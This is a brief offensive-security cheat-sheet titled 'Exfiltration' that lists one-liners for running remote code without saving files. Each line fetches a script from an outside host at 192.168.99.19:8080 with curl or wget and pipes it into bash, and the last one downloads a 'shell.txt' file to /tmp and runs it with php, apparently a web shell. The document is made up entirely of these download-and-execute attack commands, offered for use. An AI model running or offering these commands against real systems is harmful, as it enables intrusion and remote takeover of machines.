# Exfiltration

### Execute code without download files locally

```bash
#Curl
curl -fsSL http://192.168.99.19:8080/test.sh | bash
bash < <( curl http://192.168.99.19:8080/test.sh  )

#Wget
wget -q -O- http://192.168.99.19:8080/test.sh | bash
wget http://192.168.99.19:8080/shell.txt -O /tmp/x.php && php /tmp/x.php
```

